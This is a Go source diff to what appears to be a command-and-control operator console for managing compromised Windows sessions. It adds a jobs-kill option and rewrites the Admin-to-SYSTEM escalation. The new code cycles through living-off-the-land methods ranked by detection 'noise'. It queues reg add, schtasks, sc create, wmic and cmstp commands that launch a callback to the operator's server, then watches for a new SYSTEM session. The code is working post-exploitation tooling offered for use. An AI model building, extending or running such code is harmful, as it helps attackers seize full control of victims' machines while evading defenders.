@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"regexp"
 	"sort"
 	"strconv"
 	"strings"
@@ -266,7 +267,7 @@ func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
 	case "stop-server", "stop":
 		return is.handleStopServer()
 	case "jobs", "j":
-		is.printJobs()
+		return is.handleJobs(args)
 	case "kill", "k":
 		return is.handleKill(args)
 	case "generate", "gen", "g":
@@ -1398,6 +1399,29 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 	fmt.Printf("[+] Size: %d bytes\n", len(data))
 	fmt.Printf("[+] Saved to: %s\n", outputPath)
 
+	return nil
+}
+
+func (is *InteractiveServer) handleJobs(args []string) error {
+	// Check for kill flag
+	if len(args) > 0 {
+		if args[0] == "--kill" || args[0] == "-k" {
+			if len(args) < 2 {
+				return fmt.Errorf("job ID required\n" +
+					"  Usage: jobs --kill <job_id> or jobs -k <job_id>\n" +
+					"  Example: jobs --kill 3")
+			}
+			// Call handleKill with the job ID
+			return is.handleKill([]string{args[1]})
+		}
+		return fmt.Errorf("unknown jobs option: %s\n" +
+			"  Usage: jobs [--kill|-k <job_id>]\n" +
+			"  Example: jobs\n" +
+			"  Example: jobs --kill 3", args[0])
+	}
+
+	// No flags - just print jobs
+	is.printJobs()
 	return nil
 }
 
@@ -2670,129 +2694,165 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 		}
 	}
 
-	// Step 3: If admin, escalate to SYSTEM
+	// Step 3: If admin, escalate to SYSTEM using LOLBins
 	if currentPriv == core.PrivilegeAdmin {
-		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation\n")
-		
-		// Step 3.1: Enumerate named pipes for exploitation opportunities
-		var vulnerablePipes []string
-		fmt.Printf("[*] Step 3.1: Enumerating named pipes for weak permissions...\n")
-		pipes, err := is.executeAccessChkNamedPipes(sessionID)
-		if err == nil && len(pipes) > 0 {
-			fmt.Printf("[+] Found %d vulnerable named pipes\n", len(pipes))
-			vulnerablePipes = pipes
-			for _, pipe := range pipes {
-				fmt.Printf("    [PIPE] %s\n", pipe)
-			}
-		} else {
-			fmt.Printf("[!] Named pipe enumeration not available or no vulnerable pipes found\n")
-		}
+		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation (using LOLBins)...\n")
 
-		fmt.Printf("[*] Executing Get-System module...\n")
+		lolbinEsc := &privesc.LOLBinEscalation{}
+		methods := lolbinEsc.GetAdminToSystemMethods()
+		// Sort by noise level (Low first)
+		sort.Slice(methods, func(i, j int) bool {
+			noiseMap := map[string]int{"Low": 1, "Medium": 2, "High": 3}
+			return noiseMap[methods[i].NoiseLevel] < noiseMap[methods[j].NoiseLevel]
+		})
 
-		// Prioritize NamedPipe if vulnerable pipes found, otherwise try NamedPipe first, then Token
-		techniques := []string{"NamedPipe", "Token"}
-		if len(vulnerablePipes) > 0 {
-			fmt.Printf("[+] Prioritizing NamedPipe technique due to discovered vulnerable pipes\n")
-			techniques = []string{"NamedPipe", "Token"} // NamedPipe already first
-		}
 		escalatedToSystem := false
+		for i, method := range methods {
+			fmt.Printf("[*] Trying method %d/%d: %s (Noise: %s)\n", i+1, len(methods), method.Name, method.NoiseLevel)
 
-		for _, technique := range techniques {
-			fmt.Printf("[*] Trying Get-System with %s technique...\n", technique)
-
-			// Use discovered pipe if available for NamedPipe technique
-			pipeName := ""
-			if technique == "NamedPipe" && len(vulnerablePipes) > 0 {
-				pipeName = vulnerablePipes[0] // Use first discovered pipe
-				fmt.Printf("[+] Using discovered pipe: %s\n", pipeName)
+			// Get callback URL for spawn command
+			callbackURL := is.getCallbackURL(session)
+			if callbackURL == "" {
+				return fmt.Errorf("could not determine callback URL")
 			}
 
-			params := map[string]interface{}{
-				"session_id":  sessionID,
-				"Technique":   technique,
-				"ServiceName": "",
-				"PipeName":    pipeName,
-			}
+			// Generate spawn command using LOLBins
+			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
 
-			taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
-			task := &tasks.Task{
-				ID:         taskID,
-				Type:       "module",
-				Command:    "powershell/privesc/getsystem",
-				Parameters: params,
-			}
-			is.server.EnqueueTask(task)
+			// Execute method commands with proper timing and error checking
+			commandFailed := false
+			for idx, cmdTemplate := range method.Commands {
+				// Properly escape spawnCmd based on command type to avoid nested quote issues
+				var cmd string
+				if strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) {
+					// For reg add /d, we need to escape quotes
+					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/tr "%s"`) {
+					// For schtasks /tr, we need to escape quotes
+					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`) {
+					// For schtasks /change /tr, we need to escape quotes
+					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`) {
+					// For sc binPath=, we need to escape quotes
+					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else {
+					// For other commands, use spawnCmd as-is
+					cmd = fmt.Sprintf(cmdTemplate, spawnCmd)
+				}
 
-			// Wait for completion
-			is.pollTaskResultWithTimeout(sessionID, taskID, 30*time.Second)
+				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+				task := &tasks.Task{
+					ID:         taskID,
+					Type:       "shell",
+					Command:    cmd,
+					Parameters: map[string]interface{}{"session_id": sessionID},
+				}
+				is.server.EnqueueTask(task)
 
-			// Check result
-			getSystemTask := is.taskQueue.Get(taskID)
-			if getSystemTask != nil && getSystemTask.Status == "completed" {
-				if resultMap, ok := getSystemTask.Result.(map[string]interface{}); ok {
-					if resultValue, ok := resultMap["result"].(string); ok {
-						// Parse the output to determine if Get-System succeeded
-						// Get-System shows "Running as: DOMAIN\USER" - if it's SYSTEM, it succeeded
-						lines := strings.Split(resultValue, "\n")
-						runningAsUser := ""
-						hasFailure := false
-						
-						for _, line := range lines {
-							lineLower := strings.ToLower(line)
-							// Check for explicit failure messages
-							if strings.Contains(lineLower, "did not achieve system privileges") ||
-								strings.Contains(lineLower, "openscmanager failed") ||
-								(strings.Contains(lineLower, "warning") && strings.Contains(lineLower, "elevation")) {
-								hasFailure = true
+				// Determine timeout based on command type
+				timeout := 10 * time.Second
+				if strings.Contains(cmd, "schtasks") {
+					timeout = 10 * time.Second
+				} else if strings.Contains(cmd, "sc ") {
+					timeout = 10 * time.Second
+				} else if strings.Contains(cmd, "reg") {
+					timeout = 5 * time.Second
+				} else if strings.Contains(cmd, "ping") {
+					timeout = 5 * time.Second
+				} else if strings.Contains(cmd, "cmstp") {
+					timeout = 15 * time.Second
+				} else if strings.Contains(cmd, "wmic") {
+					timeout = 10 * time.Second
+				}
+
+				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)
+
+				// Check command result for errors
+				taskResult := is.taskQueue.Get(taskID)
+				if taskResult != nil && taskResult.Status == "completed" {
+					// Check for common error patterns
+					var output string
+					if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
+						if resultValue, ok := resultMap["result"].(string); ok {
+							output = resultValue
+							errorLower := strings.ToLower(output)
+							// Check WMI ReturnValue
+							if strings.Contains(cmd, "wmic") && strings.Contains(errorLower, "returnvalue") {
+								if strings.Contains(errorLower, "returnvalue.*=.*9") || strings.Contains(errorLower, "returnvalue = 9") {
+									if idx < 2 {
+										fmt.Printf("[!] Command failed: %s\n", cmd)
+										commandFailed = true
+										break
+									}
+								}
 							}
-							// Extract "Running as:" line
-							if strings.Contains(lineLower, "running as:") {
-								// Extract username after "Running as: "
-								parts := strings.SplitN(line, ":", 2)
-								if len(parts) == 2 {
-									runningAsUser = strings.TrimSpace(parts[1])
+							// Check for critical errors that indicate command failure
+							if strings.Contains(errorLower, "access is denied") ||
+								strings.Contains(errorLower, "failed") ||
+								strings.Contains(errorLower, "error") ||
+								strings.Contains(errorLower, "invalid syntax") {
+								// Only fail on critical commands (first few), allow cleanup to proceed
+								if idx < 2 {
+									fmt.Printf("[!] Command failed: %s\n", cmd)
+									commandFailed = true
+									break
+								}
+							}
+							// Check for CheckResult pattern if specified
+							if method.CheckResult != "" {
+								matched, _ := regexp.MatchString(method.CheckResult, output)
+								if !matched && idx < 2 {
+									fmt.Printf("[!] Command output validation failed: %s\n", cmd)
+									commandFailed = true
+									break
 								}
 							}
 						}
-						
-						// Determine success: must be running as SYSTEM and no failure indicators
-						runningAsSystem := false
-						if runningAsUser != "" {
-							userLower := strings.ToLower(runningAsUser)
-							// Check if it's actually SYSTEM
-							if strings.Contains(userLower, "nt authority\\system") ||
-								(userLower == "system") ||
-								(strings.Contains(userLower, "system") && !strings.Contains(userLower, "\\")) {
-								runningAsSystem = true
-							}
-						}
-						
-						// Success = running as SYSTEM AND no failure indicators
-						if runningAsSystem && !hasFailure {
-							fmt.Printf("[+] Successfully escalated to SYSTEM using %s technique!\n", technique)
-							fmt.Printf("[+] Running as: %s\n", runningAsUser)
-							escalatedToSystem = true
-							break
-						} else {
-							// Failed - show why
-							if hasFailure {
-								fmt.Printf("[!] Get-System failed: Elevation did not achieve SYSTEM privileges\n")
-							} else if runningAsUser != "" {
-								fmt.Printf("[!] Get-System failed: Still running as %s (not SYSTEM)\n", runningAsUser)
-							} else {
-								fmt.Printf("[!] Get-System failed: Could not determine result\n")
-							}
-							// Try next technique
-							continue
-						}
+					}
+				} else if taskResult != nil && taskResult.Status == "failed" {
+					// Critical command failed
+					if idx < 2 {
+						fmt.Printf("[!] Command execution failed: %s\n", cmd)
+						commandFailed = true
+						break
 					}
 				}
 			}
+
+			if commandFailed {
+				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
+				continue
+			}
+
+			// Wait for escalation to take effect
+			fmt.Printf("[*] Waiting for new SYSTEM session to connect...\n")
+			time.Sleep(8 * time.Second)
+
+			// Check if a new SYSTEM session appeared
+			allSessions := is.sessionMgr.ListSessions()
+			for _, newSession := range allSessions {
+				if newSession.GetPrivilegeLevel() == core.PrivilegeSystem {
+					fmt.Printf("[+] Successfully escalated to SYSTEM using %s!\n", method.Name)
+					fmt.Printf("[+] New SYSTEM session: %s\n", newSession.ID)
+					escalatedToSystem = true
+					break
+				}
+			}
+
+			if escalatedToSystem {
+				break
+			}
+
+			fmt.Printf("[!] Method %s did not produce SYSTEM session, trying next...\n", method.Name)
 		}
 
 		if !escalatedToSystem {
-			return fmt.Errorf("failed to escalate from Admin to SYSTEM: both techniques failed")
+			return fmt.Errorf("failed to escalate from Admin to SYSTEM using LOLBins: all %d methods failed", len(methods))
 		}
 	}
 
